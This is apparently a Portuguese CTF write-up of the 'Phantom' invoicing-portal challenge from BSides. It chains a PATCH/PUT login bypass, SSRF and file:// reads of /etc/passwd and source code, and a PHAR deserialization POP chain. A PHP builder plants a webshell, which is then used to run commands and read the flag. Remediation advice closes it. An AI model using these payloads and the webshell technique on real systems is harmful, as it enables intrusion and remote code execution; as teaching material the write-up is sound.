# Phantom (NFS-e Portal): como a gente resolveu depois da BSides

Olá! Me chamo João Silva, sou pesquisador e hacker ético. Eu e minha equipe jogamos o CTF da BSides e ficamos travados na máquina Phantom, sem fechar a tempo. Depois do evento a gente sentou, respirou e resolveu do começo.

Resolvi escrever do jeito que realmente aconteceu, com os becos sem saída, porque é aí que mora o aprendizado. Tem coisa nesse desafio que parece impossível de adivinhar: a senha do admin, os nomes das classes da POP chain, o caminho da flag. E a graça é justamente essa. Nada disso foi adivinhado. Cada peça só apareceu quando a vulnerabilidade anterior abriu a porta da seguinte.

**Ferramental.** Ao longo do processo usei o Agente VION, um agente de pentest que eu mesmo desenvolvi para apoiar as demandas do dia a dia. Ele organiza o recon, automatiza tarefas repetitivas (fuzzing de método, varredura interna via SSRF, extração de fonte) e ajuda a montar o exploit final. Ele não resolve o desafio por você; ele tira o atrito do caminho pra você pensar no que importa.

**Flag:** `hackingclub{d3s3r4l1z4710n_ch41n_l1k3_4_pr0}`

## 1. Onde a gente travou (e por que não fechou no evento)

O recon inicial é frustrante. Tudo responde `401` ou `302` redirecionando pro login, menos o próprio `login.php`. A superfície visível é minúscula:

```
login.php          200  (único público)
dashboard.php      302 -> login
api/render.php     401  {"error":"not authenticated"}
api/history.php    401
api/upload.php     401
```

Sem sessão, não dá pra fazer nada. O jogo todo vira "como conseguir uma sessão", e foi aqui que queimamos horas no evento, em caminhos que não eram a entrada:

* Brute force do admin (rockyou): a pista `<!-- TODO: disable admin account... ticket #412 -->` no HTML grita "senha fraca de admin". Testamos cerca de 100 mil senhas. Nada. A senha existia, mas não era de dicionário; só fomos descobrir lendo o código, no passo 4.
* Forjar sessão PHP: o servidor tem `session.use_strict_mode = 0` e sessões em arquivo no `/tmp`, combinação clássica de Session Upload Progress. Tentamos de tudo, inclusive via HTTP/3. Não rolou, porque o Cloudflare na frente bufferiza o upload e mata a janela do race.
* Spoof de localhost: a tese de que "admin só loga de localhost" levou a `X-Forwarded-For`, `X-Real-IP`, `Host: localhost` e afins. O Cloudflare normaliza e bloqueia tudo.

Nenhuma era a entrada. A lição que tiramos: quando a autenticação está blindada e credencial ou sessão não cedem, pare de bater na porta e questione a forma da requisição.

## 2. A entrada de verdade: bypass pelo método HTTP

O formulário de login é `method="POST"`. A ideia simples que faltava: e se o servidor tratar outros métodos de forma diferente? Em vez de teorizar, fuzzei o método HTTP no `login.php` com um usuário qualquer e comparei as respostas:

```
POST   username=admin  -> 200  "Incorrect username or password."
PATCH  username=admin  -> 302  Location: /dashboard.php   + Set-Cookie: PHPSESSID=...
PUT    username=admin  -> 302  (igual)
```

`PATCH` e `PUT` logam sem senha. Do zero pra sessão de admin com:

```http
PATCH /login.php HTTP/1.1
Host: phantom.hackingclub.com.br
Content-Type: application/x-www-form-urlencoded
Content-Length: 14

username=admin
```

Nessa hora ainda não sabíamos por que funcionava, só que funcionava. O porquê (e a senha real) só apareceu no passo 4, quando conseguimos ler o fonte.

## 3. Já autenticados: achando a superfície real

Com a sessão, o dashboard libera funções novas (emitir nota, configurar empresa). No JavaScript das páginas (`issue.php`, `company.php`), dois detalhes saltaram:

* `company.php` faz uma consulta de CNPJ chamando `GET /api/cnpj.php?cnpj=...&api=<URL>`, onde a URL da API é controlada pelo usuário. Cheiro de SSRF na hora.
* `issue.php` monta um JSON da nota e manda pra `POST /api/render.php`, que devolve um PDF.

Testando o `cnpj.php`, confirmamos: ele faz a requisição no servidor e reflete o corpo da resposta. E aceita `file://`:

```
GET /api/cnpj.php?cnpj=&api=file:///etc/passwd
-> root:x:0:0:root:/root:/bin/bash ...
```

SSRF e LFI confirmados. Esse foi o pivô que mudou tudo. A partir daqui conseguimos ler arquivos do servidor, e é isso que torna o resto possível.

Perdemos um tempo aqui tentando ler a flag direto (`file:///flag`, `/flag.txt` e variações). Não estava no container do portal. Antes da flag, precisávamos entender a aplicação.

## 4. Lendo o código fonte (aqui as mágicas deixam de ser mágica)

Antes de ler fonte às cegas, provocamos um erro pra descobrir os caminhos. O `render.php` tem `display_errors` ligado. Mandando um JSON quebrado (campo numérico como string), ele vazou:

```
Warning: number_format() expects parameter 1 to be float, string given
in /var/www/nfse-renderer/Invoice/PdfRenderer.php on line 34
```

Duas descobertas de uma vez. Primeiro, existe um serviço separado, o `nfse-renderer`. Segundo, ele vive em `/var/www/...`. A metadata de um PDF gerado (`/Producer`) confirmou o motor: mPDF.

E o detalhe que destrava tudo: `/var/www` é volume compartilhado entre portal e renderer. Então, com a LFI do `cnpj.php`, lemos o fonte do renderer a partir do portal:

```
GET /api/cnpj.php?cnpj=&api=file:///var/www/nfse-renderer/public/index.php
GET /api/cnpj.php?cnpj=&api=file:///var/www/nfse-renderer/Invoice/PdfRenderer.php
```

Aproveitamos pra ler o `login.php`, e aí apareceu a explicação do passo 2 e a senha que o brute force jamais acharia:

```php
if ($method === 'POST') {
    if ($username === 'admin' && $password === '@NfseProd2026!') { /* ... */ }   // senha real
    $error = 'Incorrect username or password.';
} elseif (in_array($method, ['PUT', 'PATCH'])) {       // o bypass
    parse_str(file_get_contents('php://input'), $body);
    if (($body['username'] ?? '') !== '') $_SESSION['user'] = $body['username'];  // sem senha
}
```

Esse é o coração do writeup. Ninguém adivinhou `@NfseProd2026!` nem os nomes de classe abaixo. A LFI do passo 3 é o que permite ler o código. Sem ela, o renderer é uma caixa preta e a POP chain seria impossível de montar. A ordem importa.

### O que o fonte do renderer entregou

No `PdfRenderer.php`, o tratamento do logo da empresa:

```php
$isSharedVolume = strpos($logoPath, '/var/www/shared/logos/') === 0;
$isPhar         = stripos($logoPath, 'phar://') === 0;     // aceita o wrapper phar://
if (!empty($logoPath) && ($isSharedVolume || $isPhar)) {
    $logoData = @file_get_contents($logoPath);            // file_get_contents em phar:// = deserialize
}
```

`logo_path` é um campo do JSON que a gente controla. E `file_get_contents('phar://...')` desserializa a metadata do phar, gatilho clássico de PHAR deserialization. Faltava a cadeia de gadgets. Lendo os outros arquivos do projeto, achamos exatamente o que precisávamos:

```php
// NfseExportJob.php
public function __destruct() { $this->processor->cleanup($this->exportConfig); }
// XmlSchemaValidator.php
public function cleanup($config) {
    $schema = file_get_contents($this->schemaPath);
    if ($schema !== false && strpos($schema,'xmlns:nfse') !== false && $this->onValidate !== null)
        ($this->onValidate)($schema, $config);
}
// NfseTemplateRenderer.php
public function __invoke($schema, $config) {
    if ($this->cacheFile !== null && $this->template !== null)
        file_put_contents($this->cacheFile, $this->template);   // escrita arbitrária
}
```

A sequência `__destruct`, `cleanup`, `__invoke` resulta em escrever um arquivo qualquer, com conteúdo qualquer. Um webshell, por exemplo.

Antes do phar, batemos em mais dois becos no renderer (vale o registro). Apontar `logo_path` direto pra `/etc/passwd` com path traversal lia o arquivo, mas o mPDF tratava como imagem inválida e descartava, nada vazava no PDF. E a tag `<annotation file=...>` do mPDF (uma LFI conhecida) estava desabilitada. O `phar://` foi o caminho que o próprio código do renderer autorizava.

## 5. Montando a POP chain e ganhando RCE

Detalhe do `cleanup()`: ele só dispara se `schemaPath` apontar pra um arquivo contendo a string `xmlns:nfse`. Em vez de subir um arquivo só pra isso, apontamos pro próprio fonte `XmlSchemaValidator.php`, que tem o literal `'xmlns:nfse'` na linha do `strpos`. Assim o phar fica estático e reutilizável.

O `upload.php` (lido via LFI) valida só a extensão, não o conteúdo. Então subimos o phar disfarçado de `.png`:

```php
// php -d phar.readonly=0 build.php
$t = new NfseTemplateRenderer();
$t->cacheFile = "/var/www/nfse-renderer/public/sh.php";
$t->template  = '<?php system($_GET[0]); ?>';
$v = new XmlSchemaValidator();
$v->schemaPath = "/var/www/nfse-renderer/Xml/XmlSchemaValidator.php"; // contém xmlns:nfse
$v->onValidate = $t;
$j = new NfseExportJob(); $j->processor = $v; $j->exportConfig = "x";
$p = new Phar("x.phar");
$p->setStub("GIF89a<?php __HALT_COMPILER();");   // magic GIF pra passar como imagem
$p->addFromString("a.txt","x"); $p->setMetadata($j); $p->stopBuffering();
```

Fluxo final:

1. Upload do phar via `POST /api/upload.php` (campo `logo`), que devolve `/var/www/shared/logos/<md5>.png`.
2. Disparo da desserialização via `POST /api/render.php` com `provider.logo_path = "phar://<caminho>"`. A POP chain escreve `sh.php` no webroot do renderer.

## 6. Executando e pegando a flag

O webshell roda no renderer, que não é exposto pra internet. Mas ainda temos o SSRF do `cnpj.php`, e o host interno `renderer` não está na blocklist do filtro:

```
GET /api/cnpj.php?cnpj=&api=http://renderer/sh.php?0=id
-> uid=33(www-data) gid=33(www-data)

GET /api/cnpj.php?cnpj=&api=http://renderer/sh.php?0=ls%20/
-> ... flag.txt ...

GET /api/cnpj.php?cnpj=&api=http://renderer/sh.php?0=cat%20/flag.txt
-> hackingclub{d3s3r4l1z4710n_ch41n_l1k3_4_pr0}
```

A flag não foi adivinhada. Listamos `/` com o RCE, vimos o `flag.txt` e lemos.

## Por que a ordem é toda a sacada

```
[1] bypass de método  ->  ganha SESSÃO
        |
[2] SSRF/LFI (cnpj)   ->  ganha LEITURA DE ARQUIVO
        |
[3] /var/www shared   ->  LÊ O FONTE DO RENDERER  (senha, gadgets, regra do logo_path)
        |
[4] phar deserialize  ->  ESCRITA ARBITRÁRIA -> webshell
        |
[5] SSRF de novo      ->  EXECUTA o webshell no renderer -> flag
```

Cada bug é inútil sozinho. O que tornou possível saber os nomes das classes e a senha não foi sorte. Foi a LFI dos passos 2 e 3 transformando a aplicação de caixa preta em caixa branca. Esse encadeamento a gente não enxergou no calor do evento; só montou com calma depois.

## Exploit automatizado

O [`phantom_exploit.py`](./phantom_exploit.py) executa a cadeia inteira (só precisa de `python3`, e o phar é montado em Python puro):

```bash
python3 phantom_exploit.py
# [+] auth bypass via PATCH > sessao admin
# [+] LFI/SSRF confirmados
# [+] phar enviado
# [+] RCE confirmada
# [+] FLAG: hackingclub{...}
```

## Resumo da kill chain

| # | Vulnerabilidade | Onde | Resultado |
|---|---|---|---|
| 1 | Auth bypass por método HTTP | `login.php` (`PUT`/`PATCH`) | sessão de admin sem senha |
| 2 | SSRF e LFI (blocklist fraca) | `api/cnpj.php` (`api=`) | leitura de arquivo e acesso interno |
| 3 | Fonte exposto por volume compartilhado | `/var/www` (portal e renderer) | senha real e gadgets da POP chain |
| 4 | PHAR deserialization e escrita arbitrária | `render.php` (`logo_path=phar://`) | webshell no renderer |
| 5 | SSRF reaproveitado | `api/cnpj.php` para `http://renderer/` | RCE e leitura da flag |

## Correções recomendadas

1. Auth: validar credenciais de forma uniforme; métodos não esperados devem retornar `405`.
2. SSRF: usar allowlist de host e esquema (não blocklist); bloquear `file://` e redes internas.
3. Upload: validar o conteúdo real (magic bytes) e servir uploads de um domínio sem execução.
4. Deserialization: nunca passar entrada do usuário para `file_get_contents('phar://...')`; evitar gadgets com I/O em `__destruct` e `__invoke`.
5. Isolamento: o renderer não deveria confiar em caminhos arbitrários vindos do portal nem compartilhar `/var/www` inteiro. E `display_errors` deve ficar desligado em produção.

## Encerramento

Writeup pós CTF, escrito pra ensinar o processo, não só a resposta. Apoio de ferramental do Agente VION, desenvolvido por mim para otimizar demandas de pentest.

João Silva, pesquisador de segurança e hacker ético.
